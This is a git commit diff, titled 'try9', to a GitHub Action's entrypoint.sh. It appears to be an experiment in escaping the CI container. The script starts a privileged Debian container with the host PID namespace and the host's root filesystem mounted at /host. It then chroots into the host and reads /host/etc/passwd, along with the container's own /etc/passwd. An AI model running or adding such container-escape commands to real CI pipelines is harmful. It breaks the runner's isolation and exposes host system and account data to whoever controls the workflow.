ff0b8d7e54806cbf6de689144313b9cf354f92f5
Aditya <adityagujar@gmail.com>
2019-08-31 20:21:56 -0400

    try9

--- action-a/entrypoint.sh
+++ action-a/entrypoint.sh
@@ -7,15 +7,10 @@ echo "\n\nIn the container"
 whoami
 cat /etc/passwd
 echo "\n\nOn the host"
-#docker run --privileged --pid=host --name dddd -v /:/host -d debian
-#sleep 10
-#docker ps
-#docker exec dddd "echo Hello from host"
-#docker exec dddd "whoami"
-#docker exec dddd "cat /etc/passwd"
 docker run --privileged --rm --pid=host -t -d -v /:/host --name dddd debian
 docker ps
 docker exec dddd whoami
 docker exec dddd ls /host
 docker exec dddd chroot /host
-docker exec dddd ps
+docker exec dddd cat /host/etc/passwd
+docker exec dddd ifconfig
